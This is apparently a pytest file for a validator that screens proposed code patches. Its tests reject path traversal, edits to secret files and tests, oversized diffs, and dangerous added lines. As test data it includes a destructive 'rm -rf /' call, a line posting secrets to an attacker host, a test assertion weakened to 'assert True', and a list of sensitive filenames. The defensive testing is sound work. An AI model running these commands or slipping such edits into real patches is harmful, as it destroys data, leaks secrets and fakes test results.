"""Unit tests for Phase 5 Unified Diff and Patch Validator."""

from __future__ import annotations

import pytest
from app.core.config import Settings
from app.domain.patches.models import (
    ChangeSummaryItem,
    PatchProposal,
    PatchValidationClassification,
)
from app.domain.patches.patch_validator import (
    clean_diff_path,
    parse_unified_diff_files_and_hunks,
    validate_patch_proposal,
)


@pytest.fixture
def settings() -> Settings:
    return Settings(
        MAX_GENERATED_PATCH_BYTES=10000,
        MAX_PATCH_FILES=3,
        MAX_PATCH_HUNKS=5,
    )


def test_clean_diff_path():
    assert clean_diff_path("a/src/calculator.py") == "src/calculator.py"
    assert clean_diff_path("b/src/calculator.py") == "src/calculator.py"
    assert clean_diff_path("src/calculator.py") == "src/calculator.py"
    assert clean_diff_path("  a/app/main.py  ") == "app/main.py"


def test_parse_unified_diff():
    diff = (
        "--- a/src/calculator.py\n"
        "+++ b/src/calculator.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def divide(a, b):\n"
        "-    return a * b\n"
        "+    return a / b\n"
    )
    files, hunks, added_lines = parse_unified_diff_files_and_hunks(diff)
    assert files == ["src/calculator.py"]
    assert hunks == 1
    assert added_lines == ["    return a / b"]


def test_valid_patch_proposal(settings: Settings):
    proposal = PatchProposal(
        description="Fix divide calculation to use division operator.",
        patch_format="unified_diff",
        patch_content=(
            "--- a/src/calculator.py\n"
            "+++ b/src/calculator.py\n"
            "@@ -1,2 +1,2 @@\n"
            " def divide(a, b):\n"
            "-    return a * b\n"
            "+    return a / b\n"
        ),
        changed_files=["src/calculator.py"],
        change_summary=[
            ChangeSummaryItem(
                file="src/calculator.py",
                reason="Use division instead of multiplication.",
            )
        ],
        reasoning="Multiplication operator was mistakenly used.",
    )

    result = validate_patch_proposal(
        proposal,
        settings,
        existing_repo_files={"src/calculator.py", "README.md"},
        allowed_affected_files={"src/calculator.py"},
    )
    assert result.is_valid is True
    assert result.classification == PatchValidationClassification.VALID
    assert result.hunk_count == 1
    assert result.parsed_files == ["src/calculator.py"]
    assert len(result.errors) == 0


def test_malformed_diff(settings: Settings):
    # Missing diff headers and hunks
    proposal = PatchProposal(
        description="Malformed patch",
        patch_format="unified_diff",
        patch_content="def divide(a, b):\n    return a / b\n",
        changed_files=["src/calculator.py"],
        reasoning="Missing headers",
    )
    result = validate_patch_proposal(proposal, settings)
    assert result.is_valid is False
    assert result.classification == PatchValidationClassification.MALFORMED_DIFF


def test_declared_vs_parsed_files_mismatch(settings: Settings):
    proposal = PatchProposal(
        description="Declared files mismatch",
        patch_format="unified_diff",
        patch_content=(
            "--- a/src/calculator.py\n"
            "+++ b/src/calculator.py\n"
            "@@ -1,2 +1,2 @@\n"
            "- old\n"
            "+ new\n"
        ),
        changed_files=["src/other.py"],
        reasoning="Mismatch",
    )
    result = validate_patch_proposal(proposal, settings)
    assert result.is_valid is False
    assert result.classification == PatchValidationClassification.MALFORMED_DIFF


def test_path_traversal_rejected(settings: Settings):
    proposal = PatchProposal(
        description="Path traversal attack",
        patch_format="unified_diff",
        patch_content=(
            "--- a/../etc/passwd\n"
            "+++ b/../etc/passwd\n"
            "@@ -1,1 +1,1 @@\n"
            "-root:x:0:0\n"
            "+root:x:0:0:hacked\n"
        ),
        changed_files=["../etc/passwd"],
        reasoning="Attempt traversal",
    )
    result = validate_patch_proposal(proposal, settings)
    assert result.is_valid is False
    assert result.classification == PatchValidationClassification.PATH_VIOLATION


def test_absolute_path_rejected(settings: Settings):
    proposal = PatchProposal(
        description="Absolute path attack",
        patch_format="unified_diff",
        patch_content=("--- /etc/shadow\n+++ /etc/shadow\n@@ -1,1 +1,1 @@\n-x\n+y\n"),
        changed_files=["/etc/shadow"],
        reasoning="Attempt absolute path",
    )
    result = validate_patch_proposal(proposal, settings)
    assert result.is_valid is False
    assert result.classification == PatchValidationClassification.PATH_VIOLATION


def test_sensitive_file_modification_rejected(settings: Settings):
    for sensitive in [
        ".env",
        ".env.local",
        "credentials.json",
        "service-account.json",
        "id_rsa",
        "server.key",
        "Dockerfile",
    ]:
        proposal = PatchProposal(
            description=f"Modify {sensitive}",
            patch_format="unified_diff",
            patch_content=(
                f"--- a/{sensitive}\n"
                f"+++ b/{sensitive}\n"
                "@@ -1,1 +1,1 @@\n"
                "-secret=1\n"
                "+secret=2\n"
            ),
            changed_files=[sensitive],
            reasoning="Attempt sensitive file modification",
        )
        result = validate_patch_proposal(proposal, settings)
        assert result.is_valid is False
        assert (
            result.classification
            == PatchValidationClassification.SENSITIVE_FILE_MODIFICATION
        )


def test_test_modification_rejected(settings: Settings):
    for test_file in [
        "tests/test_calculator.py",
        "tests/test_regression.py",
        "tests/conftest.py",
        "src/calc_test.py",
    ]:
        proposal = PatchProposal(
            description=f"Modify test {test_file}",
            patch_format="unified_diff",
            patch_content=(
                f"--- a/{test_file}\n"
                f"+++ b/{test_file}\n"
                "@@ -1,1 +1,1 @@\n"
                "-assert divide(10, 2) == 5\n"
                "+assert True\n"
            ),
            changed_files=[test_file],
            reasoning="Attempt weakening test assertion",
        )
        result = validate_patch_proposal(proposal, settings)
        assert result.is_valid is False
        assert result.classification == PatchValidationClassification.TEST_MODIFICATION


def test_file_not_found_in_repository(settings: Settings):
    proposal = PatchProposal(
        description="Modify nonexistent file",
        patch_format="unified_diff",
        patch_content=(
            "--- a/src/nonexistent.py\n"
            "+++ b/src/nonexistent.py\n"
            "@@ -1,1 +1,1 @@\n"
            "-foo\n"
            "+bar\n"
        ),
        changed_files=["src/nonexistent.py"],
        reasoning="Nonexistent",
    )
    result = validate_patch_proposal(
        proposal,
        settings,
        existing_repo_files={"src/calculator.py"},
    )
    assert result.is_valid is False
    assert result.classification == PatchValidationClassification.FILE_NOT_FOUND


def test_out_of_scope_change(settings: Settings):
    proposal = PatchProposal(
        description="Modify out of scope file",
        patch_format="unified_diff",
        patch_content=(
            "--- a/src/unrelated.py\n"
            "+++ b/src/unrelated.py\n"
            "@@ -1,1 +1,1 @@\n"
            "-old\n"
            "+new\n"
        ),
        changed_files=["src/unrelated.py"],
        reasoning="Out of scope",
    )
    result = validate_patch_proposal(
        proposal,
        settings,
        existing_repo_files={"src/calculator.py", "src/unrelated.py"},
        allowed_affected_files={"src/calculator.py"},
    )
    assert result.is_valid is False
    assert result.classification == PatchValidationClassification.OUT_OF_SCOPE_CHANGE


def test_patch_too_large_bytes(settings: Settings):
    huge_diff = (
        "--- a/src/calculator.py\n+++ b/src/calculator.py\n@@ -1,1 +1,1 @@\n+"
        + ("x" * 15000)
    )
    proposal = PatchProposal(
        description="Oversized patch",
        patch_format="unified_diff",
        patch_content=huge_diff,
        changed_files=["src/calculator.py"],
        reasoning="Too large",
    )
    result = validate_patch_proposal(proposal, settings)
    assert result.is_valid is False
    assert result.classification == PatchValidationClassification.PATCH_TOO_LARGE


def test_patch_too_many_hunks(settings: Settings):
    hunks = "\n".join(f"@@ -{i},1 +{i},1 @@\n-old\n+new" for i in range(1, 10))
    diff = f"--- a/src/calculator.py\n+++ b/src/calculator.py\n{hunks}\n"
    proposal = PatchProposal(
        description="Too many hunks",
        patch_format="unified_diff",
        patch_content=diff,
        changed_files=["src/calculator.py"],
        reasoning="Hunks limit exceeded",
    )
    result = validate_patch_proposal(proposal, settings)
    assert result.is_valid is False
    assert result.classification == PatchValidationClassification.PATCH_TOO_LARGE


def test_security_violation_dangerous_calls(settings: Settings):
    dangerous_lines = [
        "+ import subprocess; subprocess.Popen(['ls'])",
        "+ os.system('rm -rf /')",
        "+ eval('2 + 2')",
        "+ requests.post('https://attacker.com', data=secrets)",
        "+ socket.create_connection(('1.2.3.4', 80))",
        "+ pip install malware",
    ]
    for danger in dangerous_lines:
        proposal = PatchProposal(
            description="Dangerous patch",
            patch_format="unified_diff",
            patch_content=(
                "--- a/src/calculator.py\n"
                "+++ b/src/calculator.py\n"
                "@@ -1,1 +1,2 @@\n"
                " def divide(a, b):\n"
                f"{danger}\n"
            ),
            changed_files=["src/calculator.py"],
            reasoning="Security violation test",
        )
        result = validate_patch_proposal(proposal, settings)
        assert result.is_valid is False
        assert result.classification == PatchValidationClassification.SECURITY_VIOLATION
